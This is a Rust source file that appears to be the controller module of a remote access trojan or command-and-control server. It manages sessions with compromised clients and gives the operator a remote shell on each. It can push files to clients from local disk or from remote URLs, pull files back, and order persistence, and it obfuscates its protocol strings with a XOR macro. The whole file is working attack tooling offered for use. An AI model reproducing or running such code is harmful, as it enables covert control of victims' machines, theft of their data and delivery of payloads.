use std::ops::{Deref, DerefMut};

use xorcrypt::{e, prepare_encryption};
prepare_encryption!();
use crate::{
    input,
    models::{download_file, substr_exists, Client},
    ClientList,
};
pub async fn sessions(args: &[String], clients: &mut ClientList) {
    if args.len() == 0 {
        if clients.lock().await.len() > 0 {
            println!("\n[i] Active sessions:");
            for (index, client) in clients.lock().await.deref().iter().enumerate() {
                println!("  {} - {}", index, client.addr);
            }
            println!("");
        } else {
            println!("[-] No sessions active")
        }
    } else {
        match args[0].as_str() {
            "i" | "interact" => {
                if let Some(session_number) = args.get(1) {
                    match session_number.parse() {
                        Ok(session_number) => interact(session_number, clients).await,
                        Err(_) => println!("[-] Invalid session number"),
                    }
                } else {
                    println!("[-] No session number supplied");
                }
            }
            _ => {
                println!("[-] Invalid argument");
            }
        }
    }
}

async fn interact(session_number: u32, mut clients: &mut ClientList) {
    if !(0..clients.lock().await.len()).contains(&(session_number as usize)) {
        return println!("[-] Session does not exist");
    }
    loop {
        match input("Shell: ".to_string()).await {
            Some(cmd) => {
                let cmd = cmd.trim().to_string();
                if cmd.len() == 0 {
                    continue;
                }
                if cmd.starts_with(":") {
                    let cmd = cmd[1..].to_string();
                    match shell_commands(&cmd, &mut clients, session_number).await {
                        Ok(_) => continue,
                        Err(_) => break,
                    }
                }

                let mut guard = clients.lock().await;
                let client = guard.deref_mut().get_mut(session_number as usize).unwrap();

                if client.write(cmd.as_bytes()).await.is_err() {
                    std::mem::drop(guard);
                    disconnected(clients, session_number).await;
                    break;
                }
                match client.read().await {
                    Ok(incoming) => {
                        if incoming == b"::EOF::".to_vec() {
                            std::mem::drop(guard);
                            disconnected(clients, session_number).await;
                            break;
                        }
                        let incoming = String::from_utf8(incoming).unwrap();
                        println!("{}", incoming);
                    }
                    Err(_) => {
                        std::mem::drop(guard);
                        disconnected(clients, session_number).await;
                        break;
                    }
                }
            }
            None => {
                continue;
            }
        }
    }
}

async fn disconnected(clients: &mut ClientList, session_number: u32) {
    let mut guard = clients.lock().await;
    guard.deref_mut().remove(session_number as usize);
    println!("[-] Session {} has disconnected", session_number);
}

async fn shell_commands(
    cmd: &String,
    clients: &mut ClientList,
    session_number: u32,
) -> Result<(), ()> {
    let cmd = cmd
        .split(" ")
        .map(|x| x.to_string())
        .collect::<Vec<String>>();
    let (cmd, args) = (&cmd[0], &cmd[1..]);
    match cmd.as_str() {
        "b" | "back" => Err(()),
        "e" | "exit" => {
            let mut guard = clients.lock().await;
            guard.deref_mut().remove(session_number as usize);
            Err(())
        }
        "u" | "upload" => match args.get(0) {
            Some(utype) => match args.get(1) {
                Some(filepath) => {
                    let mut destination = &"".to_string();
                    if let Some(arg_dest) = args.get(2) {
                        destination = arg_dest;
                    }
                    process_upload(utype, filepath, destination, clients, session_number).await
                }
                None => {
                    println!("[-] File name or url must be supplied");
                    Ok(())
                }
            },
            None => {
                println!("[-] Please specify an upload type");
                Ok(())
            }
        },
        "d" | "download" => match args.get(0) {
            Some(filename) => {
                let mut guard = clients.lock().await;
                let client = guard.get_mut(session_number as usize).unwrap();
                if client
                    .write(format!("::DOWNLOAD:: {}", filename).as_bytes())
                    .await
                    .is_err()
                {
                    return Err(());
                }
                match client.read().await {
                    Ok(incoming) => {
                        if substr_exists(&incoming, e!("::STARTFILE::").as_bytes()).await {
                            download_file(&incoming).await;
                            println!("[+] File downloaded successfully");
                            Ok(())
                        } else {
                            println!("{}", String::from_utf8(incoming).unwrap());
                            Ok(())
                        }
                    }
                    Err(_) => Err(()),
                }
            }
            None => Err(()),
        },
        "p" | "persist" => match args.get(0) {
            Some(filename) => {
                let mut guard = clients.lock().await;
                let client = guard.get_mut(session_number as usize).unwrap();
                if client
                    .write(format!("::PERSIST:: {}", filename).as_bytes())
                    .await
                    .is_err()
                {
                    return Err(());
                }
                match client.read().await {
                    Ok(incoming) => {
                        println!("{}", String::from_utf8(incoming).unwrap());
                        Ok(())
                    }
                    Err(_) => Err(()),
                }
            }
            None => Err(()),
        },
        _ => Ok(()),
    }
}

async fn process_upload(
    utype: &String,
    filepath: &String,
    destination: &String,
    clients: &mut ClientList,
    session_number: u32,
) -> Result<(), ()> {
    match utype.as_str() {
        "l" | "local" => local_upload(filepath, destination, clients, session_number).await,
        "r" | "remote" => remote_upload(filepath, destination, clients, session_number).await,
        _ => {
            println!("[-] Invalid upload type");
            Ok(())
        }
    }
}

async fn remote_upload(
    url: &String,
    destination: &String,
    clients: &mut ClientList,
    session_number: u32,
) -> Result<(), ()> {
    match reqwest::get(url).await {
        Ok(response) => {
            if destination.len() == 0 {
                println!("[-] Destination cannot be empty");
                Ok(())
            } else {
                let mut guard = clients.lock().await;
                let client = guard.get_mut(session_number as usize).unwrap();
                upload_file(
                    client,
                    destination,
                    response.bytes().await.unwrap().to_vec(),
                )
                .await
            }
        }
        Err(_) => {
            println!("[-] Error downloading file");
            Ok(())
        }
    }
}
async fn local_upload(
    mut filename: &String,
    destination: &String,
    clients: &mut ClientList,
    session_number: u32,
) -> Result<(), ()> {
    match tokio::fs::read(filename).await {
        Ok(data) => {
            let mut guard = clients.lock().await;
            let client = guard.get_mut(session_number as usize).unwrap();
            if destination.len() > 0 {
                filename = destination;
            }
            match upload_file(client, filename, data).await {
                Ok(_) => Ok(()),
                Err(_) => {
                    std::mem::drop(guard);
                    disconnected(clients, session_number).await;
                    Err(())
                }
            }
        }
        Err(_) => {
            println!("[-] File not found");
            Ok(())
        }
    }
}

async fn upload_file(client: &mut Client, filename: &String, data: Vec<u8>) -> Result<(), ()> {
    if client.write_file(data, filename.as_bytes()).await.is_err() {
        return Err(());
    };
    match client.read().await {
        Ok(data) => {
            println!("{}", String::from_utf8(data).unwrap());
            Ok(())
        }
        Err(_) => Err(()),
    }
}
